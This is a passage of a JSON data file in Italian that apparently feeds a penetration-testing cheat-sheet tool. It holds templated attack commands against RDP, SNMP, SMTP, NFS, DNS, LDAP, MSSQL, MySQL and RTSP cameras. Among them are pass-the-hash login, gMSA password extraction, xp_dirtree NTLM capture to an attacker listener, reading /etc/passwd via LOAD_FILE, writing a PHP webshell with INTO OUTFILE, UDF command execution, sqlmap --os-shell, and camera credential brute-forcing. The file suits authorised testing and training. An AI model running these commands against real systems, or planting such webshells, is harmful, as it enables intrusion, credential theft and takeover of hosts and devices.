      {
        "id": "default",
        "label": "Password",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /clipboard",
        "description": "Auth con password (via NLA)."
      },
      {
        "id": "pth",
        "label": "PtH",
        "template": "xfreerdp /v:<ip> /u:<user> /pth:<hash> /dynamic-resolution",
        "description": "Pass-the-Hash con l'hash NTLM. Richiede Restricted Admin sul target."
      },
      {
        "id": "nla",
        "label": "NLA",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:nla /dynamic-resolution",
        "description": "Forza NLA/CredSSP: negozia Kerberos (se ottiene un ticket) altrimenti NTLM. Default sui target moderni."
      },
      {
        "id": "tls",
        "label": "TLS",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:tls /dynamic-resolution",
        "description": "Forza la sola sicurezza TLS, senza la mutua auth di CredSSP. Utile se l'NLA dà errori."
      },
      {
        "id": "rdp",
        "label": "RDP legacy",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:rdp /dynamic-resolution",
        "description": "Standard RDP Security legacy (cifratura debole): quando l'NLA è disattivato sul target."
      },
      {
        "id": "kerberos",
        "label": "Kerberos",
        "template": "KRB5CCNAME=<user>.ccache xfreerdp /v:<fqdn> /u:<user> /d:<domain> /sec:nla /dynamic-resolution",
        "description": "Kerberos: serve un TGT nel ccache (`KRB5CCNAME`), l'FQDN del target (non l'IP) e un DC raggiungibile. Obbligatorio se NTLM è disabilitato."
      },
      {
        "id": "share",
        "label": "Con cartella condivisa",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /drive:share,/tmp/share /clipboard /dynamic-resolution"
      }
    ],
    "note": "# Cos'è NLA\nNLA (Network Level Authentication) ti fa autenticare PRIMA che si apra la sessione RDP.\n- Attivo = meglio: nessuna schermata di login per chi non ha credenziali valide, e blocca gli exploit pre-auth (es. BlueKeep).\n- Disabilitato = peggio: chiunque arriva alla schermata di login e i vecchi exploit pre-auth tornano sfruttabili.\n# NTLM o Kerberos?\nNLA (`/sec:nla`) usa CredSSP: prova prima Kerberos, se non ottiene un ticket ripiega su NTLM.\n- NTLM: connetti per IP con `/u /p` (o `/pth:<hash>`); funziona anche senza DC.\n- Kerberos: serve un TGT nel ccache (`export KRB5CCNAME=user.ccache`), l'FQDN del target (non l'IP) e un DC raggiungibile. Obbligatorio se sul target NTLM è disabilitato.\n# Capire cosa vuole il target\n- `nxc rdp <ip>` oppure `nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>`: dicono se l'NLA è richiesto e mostrano FQDN e dominio (ti servono per Kerberos).\n- Se l'auth NTLM fallisce con NLA attivo, il target vuole Kerberos: procurati un TGT e riprova con l'FQDN.\n# I livelli /sec\n- `/sec:nla` = CredSSP (Kerberos/NTLM), default moderno\n- `/sec:tls` = solo TLS, senza mutua auth CredSSP\n- `/sec:rdp` = Standard RDP Security legacy (debole), quando l'NLA è off"
  },
  {
    "id": "snmpbulkwalk",
    "name": "snmpbulkwalk — fast walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Come snmpwalk ma usa richieste GETBULK: molto più veloce su MIB grandi. Da preferire con SNMPv2c.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmpbulkwalk",
      "snmp"
    ],
    "template": "snmpbulkwalk -v2c -c <community> <ip> .1",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "braa",
    "name": "braa — mass SNMP walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Walk SNMP parallelo e veloce. Dopo aver trovato la community, estrae rapidamente molti OID su uno o più host.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "braa",
      "snmp"
    ],
    "template": "braa <community>@<ip>:.1.*",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "snmp-check",
    "name": "snmp-check — enum leggibile",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Enumera SNMP formattando l’output in modo leggibile: utenti, processi, software, interfacce, route e share.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmp-check",
      "snmp"
    ],
    "template": "snmp-check <ip> -c <community>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 161 Pentesting SNMP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html"
      }
    ]
  },
  {
    "id": "nmap-smtp",
    "name": "nmap — SMTP scripts",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "User Enumeration",
    "description": "Script NSE: comandi supportati, enum utenti, open relay e CVE-2010-4344 (Exim).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "nmap",
      "smtp"
    ],
    "template": "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "swaks",
    "name": "swaks — invio mail / open relay",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "Open Relay",
    "description": "Invia una mail di test. Se parte verso un dominio esterno il server è un open relay; utile anche per phishing o per innescare verifiche email (es. osTicket, GitLab).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "swaks",
      "smtp",
      "open-relay"
    ],
    "template": "swaks --to user@<domain> --from test@test.com --server <ip> --body \"test\"",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 25 Pentesting SMTP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html"
      }
    ]
  },
  {
    "id": "nmap-nfs",
    "name": "nmap — NFS scripts",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Script NSE: export disponibili (nfs-showmount), contenuto (nfs-ls) e spazio (nfs-statfs), senza montare nulla.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nmap",
      "nfs"
    ],
    "template": "nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-nfs",
    "name": "nxc nfs — list shares",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Elenca gli export NFS e i relativi permessi con NetExec. `--enum-shares` aggiunge profondità e file visibili.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nxc",
      "netexec",
      "nfs"
    ],
    "template": "nxc nfs <ip> --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 2049 Pentesting NFS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
      }
    ]
  },
  {
    "id": "dns-axfr",
    "name": "dig — zone transfer (AXFR)",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Zone Transfer",
    "description": "Tenta il trasferimento di zona: se il server lo consente ottieni tutti i record del dominio in un colpo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns",
      "axfr"
    ],
    "template": "dig axfr <domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 53 Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ]
  },
  {
    "id": "dns-query",
    "name": "dig — query record",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Interroga record specifici. `NS`/`MX`/`TXT` rivelano infrastruttura ed email; `SRV` individua i servizi AD (es. `_ldap._tcp` punta ai Domain Controller).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns"
    ],
    "template": "dig A <domain> @<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "A",
        "template": "dig A <domain> @<ip>",
        "description": "Record A (IPv4)."
      },
      {
        "id": "any",
        "label": "ANY",
        "template": "dig ANY <domain> @<ip>",
        "description": "Tutti i record (spesso filtrato sui resolver moderni)."
      },
      {
        "id": "mx",
        "label": "MX/TXT",
        "template": "dig MX <domain> @<ip>; dig TXT <domain> @<ip>",
        "description": "Mail server e record TXT (SPF, verifiche di dominio, a volte info leak)."
      },
      {
        "id": "ns",
        "label": "NS",
        "template": "dig NS <domain> @<ip>",
        "description": "Name server autoritativi del dominio."
      },
      {
        "id": "srv",
        "label": "SRV (AD)",
        "template": "dig SRV _ldap._tcp.<domain> @<ip>",
        "description": "Individua i Domain Controller via record SRV LDAP."
      }
    ]
  },
  {
    "id": "dnsrecon",
    "name": "dnsrecon — enum & reverse",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Enumerazione DNS completa: prova `AXFR` e record comuni; con `-r` fa il reverse lookup di un range per mappare gli host interni.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsrecon",
      "dns"
    ],
    "template": "dnsrecon -d <domain> -n <ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Standard",
        "template": "dnsrecon -d <domain> -n <ip>",
        "description": "Enum standard del dominio (AXFR + record comuni)."
      },
      {
        "id": "reverse",
        "label": "Reverse range",
        "template": "dnsrecon -r <subnet>/24 -n <ip>",
        "description": "Reverse lookup di un range per scoprire host e nomi interni."
      }
    ]
  },
  {
    "id": "dns-svc-brute",
    "name": "dnsenum — subdomain brute",
    "category": "service-enum",
    "subcategory": "dns-svc",
    "group": "Records",
    "description": "Bruteforce di host/sottodomini via wordlist contro il DNS interno. Utile quando l’`AXFR` è negato.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsenum",
      "dns",
      "brute"
    ],
    "template": "dnsenum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
    "params": [
      {
        "key": "ip",
        "label": "DNS server",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ]
  },
  {
    "id": "ldap-desc",
    "name": "ldapsearch — password in description",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Filtra i soli oggetti con il campo description popolato: spesso vi finiscono password o note operative.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "description"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(description=*)\" sAMAccountName description",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ]
  },
  {
    "id": "windapsearch",
    "name": "windapsearch — AD enum",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Enumerazione AD via LDAP.\n- `-U` = utenti\n- `-G` = gruppi\n- `-C` = computer\n- `-m` = membri dei gruppi\n- `--da` = elenca i Domain Admins",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "windapsearch",
      "ldap",
      "ad"
    ],
    "template": "windapsearch -d <domain> -u <user>@<domain> -p <password> --dc-ip <ip> -U -G -C -m",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-ldap-users",
    "name": "nxc ldap — users & BloodHound",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Enumera utenti via LDAP. Con `--bloodhound` raccoglie in un colpo i dati per BloodHound; il modulo `get-desc-users` estrae le `description`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "bloodhound"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Utenti",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users",
        "description": "Elenca gli utenti di dominio con il loro stato."
      },
      {
        "id": "desc",
        "label": "Password nelle description",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M get-desc-users",
        "description": "Modulo che estrae il campo description di tutti gli utenti."
      },
      {
        "id": "bloodhound",
        "label": "BloodHound",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --bloodhound --collection All --dns-server <ip>",
        "description": "Raccolta dati per BloodHound (`--collection All`)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 389 Pentesting LDAP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
      }
    ]
  },
  {
    "id": "nxc-ldap-gmsa",
    "name": "nxc ldap — gMSA passwords",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Legge le password dei gMSA (Group Managed Service Account) via LDAP. Funziona se l'utente è tra i principal autorizzati (`msDS-GroupMSAMembership`). Attenzione: `--gmsa` è un'opzione del protocollo `ldap`, non `smb`, e richiede LDAPS.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "gmsa"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --gmsa",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 389 Pentesting LDAP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
      }
    ]
  },
  {
    "id": "nxc-mssql",
    "name": "nxc mssql — login & query",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Verifica le credenziali su MSSQL ed esegue query o comandi.\n- `-q` = lancia una query\n- `-x` = comando OS via `xp_cmdshell`",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "nxc",
      "netexec",
      "mssql"
    ],
    "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "sa"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Login (local-auth)",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth",
        "description": "Login SQL locale. Togli `--local-auth` per l’autenticazione di dominio (Windows auth)."
      },
      {
        "id": "query",
        "label": "Query",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases'",
        "description": "Esegue una query T-SQL e stampa il risultato."
      },
      {
        "id": "exec",
        "label": "Comando OS",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth -x 'whoami'",
        "description": "Esegue un comando OS via `xp_cmdshell` (lo abilita al volo se hai i privilegi)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 1433 Pentesting MSSQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html"
      }
    ]
  },
  {
    "id": "nmap-mssql",
    "name": "nmap — MSSQL scripts",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Script NSE: versione/istanza, configurazione, login con password vuota e info NTLM (rivela hostname e dominio senza autenticazione).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "nmap",
      "mssql"
    ],
    "template": "nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "mssql-xpdirtree",
    "name": "MSSQL — xp_dirtree NTLM capture",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Exploitation",
    "description": "Forza il servizio SQL a raggiungere una share UNC tua per catturare il NetNTLMv2 con Responder (poi crack o relay). Funziona anche senza privilegi elevati.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "xp_dirtree",
      "ntlm",
      "responder"
    ],
    "template": "EXEC xp_dirtree '\\\\<lhost>\\share', 1, 1;",
    "params": [
      {
        "key": "lhost",
        "label": "Listener (Responder)",
        "placeholder": "10.10.14.5"
      }
    ]
  },
  {
    "id": "mssql-linked",
    "name": "MSSQL — linked servers",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Exploitation",
    "description": "Enumera i server collegati: spesso permettono di saltare su altri host SQL (EXECUTE … AT), a volte con privilegi maggiori.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "linked-server",
      "lateral"
    ],
    "template": "SELECT srvname, isremote FROM sysservers;",
    "params": [
      {
        "key": "linked",
        "label": "Linked server",
        "placeholder": "SQL02\\INST"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enumera",
        "template": "SELECT srvname, isremote FROM sysservers;",
        "description": "Elenca i linked server configurati."
      },
      {
        "id": "exec",
        "label": "Query remota",
        "template": "EXECUTE('SELECT @@servername, SYSTEM_USER') AT [<linked>];",
        "description": "Esegue una query sul linked server; verifica con quale identità gira."
      }
    ]
  },
  {
    "id": "mysql-login",
    "name": "mysql — client login",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Connection",
    "description": "Connessione al database. Prova prima `root` con password vuota o credenziali deboli/di default.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "login"
    ],
    "template": "mysql -h <ip> -u <user> -p",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ]
  },
  {
    "id": "nmap-mysql",
    "name": "nmap — MySQL scripts",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Connection",
    "description": "Script NSE: versione, password vuota su root, elenco database e info utenti, senza credenziali.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "nmap",
      "mysql"
    ],
    "template": "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "mysql-queries",
    "name": "MySQL — enum & file read",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Exploitation",
    "description": "Una volta dentro: elenca i database, leggi le tabelle utenti e, con privilegio `FILE`, leggi file dal disco (`LOAD_FILE`).",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "enum",
      "file-read"
    ],
    "template": "SHOW DATABASES;",
    "params": [
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Database",
        "template": "SHOW DATABASES;",
        "description": "Elenca i database disponibili."
      },
      {
        "id": "tables",
        "label": "Tabelle",
        "template": "USE <db>; SHOW TABLES;",
        "description": "Tabelle del database scelto."
      },
      {
        "id": "loadfile",
        "label": "Leggi file",
        "template": "SELECT LOAD_FILE('/etc/passwd');",
        "description": "Legge un file dal disco (serve il privilegio FILE e secure_file_priv permissivo)."
      }
    ]
  },
  {
    "id": "mysql-privcheck",
    "name": "MySQL — check RCE",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Exploitation",
    "description": "Prima di provare la RCE, verifica se è fattibile: MySQL non ha un `xp_cmdshell` pronto, serve il privilegio `FILE` e `secure_file_priv` non bloccato.\n- `secure_file_priv` = `''` (vuoto) scrivi file ovunque · `/path` solo lì · `NULL` scrittura file disabilitata (RCE morta)\n- serve `FILE` nei tuoi grant\n- `plugin_dir` = dove va la libreria per la via UDF",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "privesc",
      "file-priv",
      "secure-file-priv"
    ],
    "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "secure_file_priv + plugin_dir",
        "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
        "description": "`secure_file_priv` vuoto = puoi scrivere file ovunque (OUTFILE/UDF ok); se è `NULL` la RCE via file è impossibile. `plugin_dir` = dove caricare la `.so` per l'UDF."
      },
      {
        "id": "grants",
        "label": "Ho FILE privilege?",
        "template": "SHOW GRANTS FOR CURRENT_USER();",
        "description": "Cerca `FILE` (o `ALL PRIVILEGES`). Senza `FILE` niente OUTFILE, LOAD_FILE o UDF-via-outfile."
      },
      {
        "id": "whoami",
        "label": "Utente corrente",
        "template": "SELECT current_user(), user();",
        "description": "Login autenticato vs quello richiesto: utile per capire il contesto."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ]
  },
  {
    "id": "mysql-oscmd",
    "name": "MySQL — RCE (OUTFILE / UDF)",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Exploitation",
    "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono `FILE` privilege e `secure_file_priv` permissivo (vedi `MySQL — check RCE`).\n- webshell: scrivi un `.php` nel webroot con `INTO OUTFILE`, poi la esegui via HTTP\n- UDF: carichi `lib_mysqludf_sys.so` nel `plugin_dir` e crei `sys_eval` per lanciare comandi come l'utente mysqld",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "rce",
      "udf",
      "outfile"
    ],
    "template": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '<webroot>/sh.php';",
    "params": [
      {
        "key": "webroot",
        "label": "Webroot",
        "placeholder": "/var/www/html"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      }
    ],
    "variants": [
      {
        "id": "outfile",
        "label": "Webshell (OUTFILE)",
        "template": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '<webroot>/sh.php';",
        "description": "Scrive una webshell PHP nel webroot. Poi RCE via `http://target/sh.php?cmd=id`. Serve conoscere il webroot e che sia scrivibile dall'utente mysqld."
      },
      {
        "id": "udf",
        "label": "UDF sys_eval",
        "template": "CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');",
        "description": "Crea la funzione UDF e lancia comandi: `sys_eval` ritorna l'output. La `.so` deve già stare nel `plugin_dir` (vedi la nota). Su Windows la SONAME è `lib_mysqludf_sys.dll`."
      },
      {
        "id": "sqlmap",
        "label": "sqlmap (auto)",
        "template": "sqlmap -d \"mysql://<user>:<password>@<ip>:3306/<db>\" --os-shell",
        "description": "Automatizza OUTFILE/UDF e apre una shell OS interattiva. `-d` = connessione diretta al DB."
      }
    ],
    "note": "# Ottenere lib_mysqludf_sys.so\nNon si genera: è una libreria già pronta, la prendi da Kali.\n- Metasploit (pronta all'uso, consigliata): `/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so`\n- sqlmap (offuscata, prima scloakala): `python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`\n# Caricarla nel plugin_dir\nServe `FILE` + `secure_file_priv` permissivo. Converti la .so in esadecimale (`xxd -p file`, uniscila su una riga) e scrivila come binario con DUMPFILE:\n`SELECT 0x<hex> INTO DUMPFILE '<plugin_dir>/lib_mysqludf_sys.so';`\npoi `CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';`",
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ]
  },
  {
    "id": "rtsp-enum",
    "name": "RTSP — nmap enum",
    "category": "service-enum",
    "subcategory": "rtsp",
    "group": "Enumeration",
    "description": "RTSP (554/8554) è lo streaming delle telecamere IP. Enumera i metodi supportati e i path di stream validi.\n- `rtsp-methods` = verbi supportati (DESCRIBE, SETUP, PLAY…)\n- `rtsp-url-brute` = trova i path di stream validi (es. `/live.sdp`)",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "nmap"
    ],
    "template": "nmap -sV --script \"rtsp-methods,rtsp-url-brute\" -p554,8554 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 554 Pentesting RTSP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
      }
    ]
  },
  {
    "id": "rtsp-cameradar",
    "name": "RTSP — cameradar (auto)",
    "category": "service-enum",
    "subcategory": "rtsp",
    "group": "Exploitation",
    "description": "Tool automatico per telecamere RTSP: scopre gli host, indovina i path di stream e fa il brute delle credenziali di default. La via più rapida per accedere a una camera.\n- `--targets` = target (IP, CIDR, range o hostname)\n- `--ports` = porte custom (default 554)\n- `--net=host` = flag Docker, così il container raggiunge la rete del target",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "cameradar",
      "brute"
    ],
    "template": "docker run --rm -t --net=host ullaakut/cameradar --targets <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
